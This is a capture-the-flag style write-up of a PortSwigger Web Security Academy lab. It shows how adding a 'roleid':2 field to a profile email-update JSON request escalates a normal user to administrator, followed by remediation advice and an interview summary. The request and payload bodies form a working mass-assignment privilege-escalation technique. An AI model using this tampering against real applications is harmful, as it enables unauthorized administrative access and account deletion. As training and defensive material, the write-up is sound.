# User Role Can Be Modified in User Profile

## 📌 Lab Information

* **Platform:** PortSwigger Web Security Academy
* **Difficulty:** Apprentice
* **Vulnerability:** Broken Access Control
* **Attack Type:** Vertical Privilege Escalation
* **Tool:** Burp Suite
* **Status:** ✅ Solved

---

## 🎯 Objective

The objective of this lab is to access the administrator panel at:

```text
/admin
```

The admin panel is restricted to authenticated users with:

```text
roleid = 2
```

The lab provides the following normal user credentials:

```text
Username: wiener
Password: peter
```

The goal is to exploit the improper handling of the `roleid` parameter, escalate the privileges of `wiener` to administrator, access `/admin`, and delete the user `carlos`.

---

## 🔍 Steps to Solve

### 1. Login as `wiener`

Opened the PortSwigger lab and logged in using the provided credentials:

```text
Username: wiener
Password: peter
```

After successful authentication, navigated to the **My Account / Profile** page.

---

### 2. Change the Email Address

The account page provided a functionality to update the email address.

Entered a new email address and submitted the request.

Example:

```text
test@example.com
```

The request was captured using:

```text
Burp Suite
    ↓
Proxy
    ↓
HTTP History
```

---

### 3. Identify the Email Update Request

Located the request generated when updating the email address.

Example:

```http
POST /my-account/change-email HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
Cookie: session=YOUR-SESSION

{
    "email":"test@example.com"
}
```

The exact endpoint and headers may vary depending on the lab environment.

---

### 4. Send the Request to Burp Repeater

Right-clicked the request and selected:

```text
Send to Repeater
```

Then opened:

```text
Burp Suite
→ Repeater
```

Burp Repeater was used to modify the request and analyze the server response.

---

### 5. Analyze the Server Response

Sent the original request and inspected the response.

The response disclosed the user's role ID.

Example:

```json
{
    "username": "wiener",
    "email": "test@example.com",
    "roleid": 1
}
```

The important value was:

```text
roleid = 1
```

This indicated that `wiener` was currently a normal user.

---

### 6. Modify the `roleid` Parameter

Modified the JSON request body to include:

```json
{
    "email": "test@example.com",
    "roleid": 2
}
```

Sent the modified request using **Burp Repeater**.

---

### 7. Verify Privilege Escalation

The server accepted the modified `roleid` value.

The response showed:

```json
{
    "username": "wiener",
    "email": "test@example.com",
    "roleid": 2
}
```

Previously:

```text
roleid = 1
```

After modification:

```text
roleid = 2
```

This confirmed that the application allowed a normal user to modify their own privilege level.

---

### 8. Access the Admin Panel

After successfully changing the role, accessed:

```text
https://YOUR-LAB-ID.web-security-academy.net/admin
```

The application now recognized `wiener` as an administrator because:

```text
roleid = 2
```

The administrator panel was successfully accessible.

---

### 9. Delete `carlos`

Inside the administrator panel, located the user:

```text
carlos
```

Used the **Delete** functionality to remove the user.

The lab was successfully completed.

```text
✅ Lab Solved
```

---

## 🔐 Vulnerability Analysis

The application incorrectly trusts a **client-controlled `roleid` parameter**.

A normal user can modify their own role by sending:

```json
{
    "roleid": 2
}
```

The server accepts the modified value without properly validating whether the user is authorized to change their role.

The vulnerable flow is:

```text
Normal User
     ↓
Change Profile
     ↓
Modify roleid
     ↓
roleid = 2
     ↓
Administrator
     ↓
Access /admin
```

---

## 🚨 Why This Is a Broken Access Control Vulnerability

The application fails to enforce authorization on the server side.

A user should not be able to determine their own privilege level through a request parameter.

The following value should be controlled by the server:

```text
roleid
```

Instead, the application trusts the value supplied by the client.

---

## 📈 Privilege Escalation

This vulnerability results in **vertical privilege escalation**.

The attacker starts as:

```text
Normal User
roleid = 1
```

and escalates to:

```text
Administrator
roleid = 2
```

This can be represented as:

```text
Low Privilege User
       ↓
Modify roleid
       ↓
Higher Privilege
       ↓
Admin Functionality
```

---

## 💥 Impact

An attacker may be able to escalate their privileges and gain access to administrative functionality.

Potential impacts include:

* Unauthorized access to admin panels
* User account deletion
* Modification of user accounts
* Privilege modification
* Access to sensitive administrative functions
* Unauthorized application configuration changes
* Potential compromise of application integrity

The exact impact depends on the administrative functionality available in the application.

---

## 🛠️ Tools Used

* **Burp Suite**

  * Proxy
  * HTTP History
  * Repeater
* **Web Browser**
* **PortSwigger Web Security Academy**

---

## 🧪 Testing Methodology

During the assessment, the following approach was used:

1. Authenticate as a normal user.
2. Identify profile/account functionality.
3. Modify a profile field such as email.
4. Capture the request using Burp Suite.
5. Analyze the server response.
6. Identify sensitive authorization-related parameters.
7. Send the request to Burp Repeater.
8. Modify the `roleid` parameter.
9. Resend the request.
10. Verify whether the role changed.
11. Attempt to access the restricted `/admin` endpoint.
12. Validate the privilege escalation by performing an administrative action.

---

## 🛡️ Remediation

### 1. Never Trust Client-Controlled Role Parameters

The application should not allow users to modify authorization-related parameters such as:

```text
roleid
role
isAdmin
permissions
privilege
```

These values should be controlled by the server.

---

### 2. Enforce Server-Side Authorization

The server should determine the user's role from a trusted server-side data source.

For example:

```text
Authenticated User
        ↓
Server retrieves role
        ↓
Authorization Check
        ↓
Allow / Deny
```

---

### 3. Protect Role Management Functions

Only authorized administrators should be able to modify user roles.

A normal user should never be able to change:

```text
roleid = 1
```

to:

```text
roleid = 2
```

through a profile update request.

---

### 4. Validate Authorization on Every Sensitive Endpoint

Administrative endpoints such as:

```text
/admin
/admin/delete-user
/admin/change-role
/admin/settings
```

must independently verify the user's authorization.

---

## 🧠 Key Learning

**Never trust authorization values supplied by the client.**

Parameters such as:

```text
roleid
isAdmin
role
permissions
```

should always be treated as untrusted input.

Changing a profile field such as an email address should not allow a user to modify their privilege level.

During VAPT testing, inspect API requests and responses for hidden or undocumented parameters related to:

* Roles
* Permissions
* User IDs
* Account status
* Privilege levels

Burp Suite **Repeater** is useful for modifying these parameters and verifying whether the server properly enforces authorization.

---

## 🎤 Interview Explanation

**Question:** How did you exploit this Broken Access Control vulnerability?

**Answer:**

> I logged in using the normal user credentials `wiener:peter` and navigated to the profile page. I used the email update functionality and intercepted the request using Burp Suite. The server response disclosed my current `roleid` as `1`. I sent the request to Burp Repeater and added `"roleid":2` to the JSON request body. The server accepted the client-controlled role value and changed my role to `2`. I then accessed `/admin` and was able to use the administrator functionality to delete `carlos`. This demonstrated a vertical privilege escalation caused by improper server-side authorization and trusting a client-controlled role parameter.

---

## 📌 Root Cause

**Improper server-side authorization and trust of a client-controlled `roleid` parameter.**

## 📌 Vulnerability Category

**OWASP Top 10: A01 – Broken Access Control**

## 📌 Attack Type

**Vertical Privilege Escalation**

## 📌 Security Impact

**Unauthorized administrative access**

## ✅ Lab Status

**Solved Successfully**



<img width="1263" height="518" alt="image" src="https://github.com/user-attachments/assets/d4639283-54ec-4f06-b0ba-a71653392b1c" />
<img width="1901" height="1015" alt="image" src="https://github.com/user-attachments/assets/cd621d44-5fbf-4cdb-b4ea-579cd91f1605" />
<img width="1893" height="1007" alt="image" src="https://github.com/user-attachments/assets/e87f8606-c43c-479d-a806-69d40df322ff" />
<img width="1492" height="861" alt="image" src="https://github.com/user-attachments/assets/5875c750-e9df-4283-8afb-883e42d258e0" />
<img width="1912" height="807" alt="image" src="https://github.com/user-attachments/assets/cc452a6a-a944-4273-aede-680f310800cf" />
<img width="1887" height="940" alt="image" src="https://github.com/user-attachments/assets/6b1e5432-1ad8-4971-ab38-55969231438c" />
<img width="1876" height="868" alt="image" src="https://github.com/user-attachments/assets/9dcc0bb1-cb07-46af-9eb1-43af456e9820" />

